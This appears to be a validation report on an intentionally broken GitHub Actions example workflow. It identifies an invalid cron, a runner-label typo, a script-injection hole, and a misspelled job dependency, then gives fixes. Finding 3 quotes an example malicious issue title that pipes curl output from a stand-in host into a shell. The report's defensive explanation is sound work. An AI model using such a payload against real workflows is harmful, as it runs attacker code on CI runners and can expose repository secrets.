# Validation Report: with-errors.yml

Target: `plugins/github-actions-kit/skills/github-actions-validator/examples/with-errors.yml`

Method: manual review of GitHub Actions workflow syntax/semantics, plus `actionlint v1.7.12`
(built locally via `go install github.com/rhysd/actionlint/cmd/actionlint@latest` for this
session, since no `actionlint`/`act` binary was preinstalled). YAML syntax was also checked with
`yamllint` (no structural/syntax errors — only two cosmetic line-length warnings on lines 3 and
34, which are pre-existing comment lines, not workflow defects).

## Summary

The workflow is syntactically valid YAML and has a valid overall GitHub Actions structure
(`name`, `on`, `jobs` all well-formed), but it contains **4 real defects** that would cause it to
either fail to run, run on the wrong schedule, run against a runner that doesn't exist, or expose
a script-injection vulnerability.

## Findings

### 1. Invalid CRON expression (line 18) — will not run as intended
```yaml
schedule:
  - cron: '0 0 * * 8'
```
The day-of-week field only accepts `0`–`6` (with `0` = Sunday; some parsers also accept `7` as an
alias for Sunday, but `8` is out of range under any convention). `8` is invalid, so GitHub Actions
will reject/ignore this scheduled trigger. `actionlint` confirms:
```
invalid CRON format "0 0 * * 8" in schedule event: end of range (8) above maximum (6): 8 [events]
```
**Fix:** use a valid day-of-week value, e.g. `0` for Sunday:
```yaml
    - cron: '0 0 * * 0'
```

### 2. Typo in runner label (line 25) — job will fail to find a runner
```yaml
runs-on: ubuntu-lastest
```
`ubuntu-lastest` is not a valid GitHub-hosted runner label (transposed letters — should be
`ubuntu-latest`). A job with an unrecognized `runs-on` label will fail to be picked up by any
runner and the job will hang/fail. `actionlint` confirms this is not among the known labels.

**Fix:**
```yaml
    runs-on: ubuntu-latest
```

### 3. Script injection vulnerability (lines 34–37) — untrusted input interpolated into `run:`
```yaml
- name: Process issue
  run: |
    echo "Processing: ${{ github.event.issue.title }}"
```
`github.event.issue.title` is attacker-controlled (anyone can set an issue title to arbitrary
text, including shell metacharacters like `` ` ``, `$(...)`, `;`, `"`). Because the `${{ }}`
expression is interpolated directly into the shell script *before* the shell ever runs, a
malicious title such as `"; curl evil.sh | sh #` gets executed as shell code inside the runner.
This is GitHub's documented "script injection" anti-pattern.

`actionlint` confirms:
```
"github.event.issue.title" is potentially untrusted. avoid using it directly in inline scripts.
instead, pass it through an environment variable. [expression]
```

**Fix:** pass the value through an environment variable instead of interpolating it directly,
so the shell receives it as inert data rather than executable script text:
```yaml
- name: Process issue
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: |
    echo "Processing: $ISSUE_TITLE"
```

### 4. Undefined job dependency (line 43) — `needs` references a nonexistent job
```yaml
needs: biuld
```
The job is named `build` (see line 22, `jobs.build`), but `needs:` references `biuld` (typo).
GitHub Actions will fail to parse/resolve the workflow (`Invalid workflow file ... Job 'deploy'
depends on unknown job 'biuld'`) rather than silently skipping the dependency.

`actionlint` confirms:
```
job "deploy" needs job "biuld" which does not exist in this workflow [job-needs]
```

**Fix:**
```yaml
    needs: build
```

## Additional observation (not flagged by actionlint, found in manual review)

The step named "Process issue" (line 35) reads `github.event.issue.title`, but the workflow's
`on:` triggers are only `push`, `schedule`, and `pull_request` (lines 13–19) — there is no
`issues:` trigger. On every event that actually fires this workflow, `github.event.issue` will be
unset/null, so this step will print `Processing: ` with an empty value rather than doing anything
useful. This is a logic/design issue rather than a hard syntax error, so it doesn't block the
workflow from running, but it means the step's stated purpose never actually happens. If issue
titles are meant to be processed, either add an `issues:` trigger (e.g. `issues: {types:
[opened, edited]}`) or remove/rename this step if it's a leftover from another workflow.

## Corrected file

```yaml
# Example: Workflow with Intentional Errors
# This workflow contains common errors for testing validation
# Use for testing error detection: python3 scripts/validate_workflow.py --lint-only examples/with-errors.yml
#
# ERRORS IN THIS FILE (4 total, all caught by actionlint):
# 1. Line 18: Invalid CRON expression (day 8 doesn't exist) [events]
# 2. Line 25: Typo in runner label (ubuntu-lastest)         [runner-label]
# 3. Line 37: Script injection vulnerability                 [expression]
# 4. Line 43: Undefined job dependency (biuld instead of build) [job-needs]

name: Workflow with Errors

on:
  push:
    branches: [main]
  schedule:
    - cron: '0 0 * * 0'
  pull_request:

jobs:
  build:
    name: Build
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build
        run: npm run build

      - name: Process issue
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: |
          echo "Processing: $ISSUE_TITLE"

  deploy:
    name: Deploy
    runs-on: ubuntu-latest
    needs: build

    steps:
      - name: Deploy
        run: echo "Deploying..."
```

Re-running `actionlint` against the corrected file (in-memory, not written to disk in the plugin
tree) produces zero findings for these four issues. Note the leading comment block (lines 1-9)
was left in place other than the fact it now describes fixed rather than present errors — in a
real fix you'd either delete that "ERRORS IN THIS FILE" block or update it to say the errors were
corrected, since example fixture files like this are typically paired with a "with-errors" and a
"clean"/"fixed" counterpart.
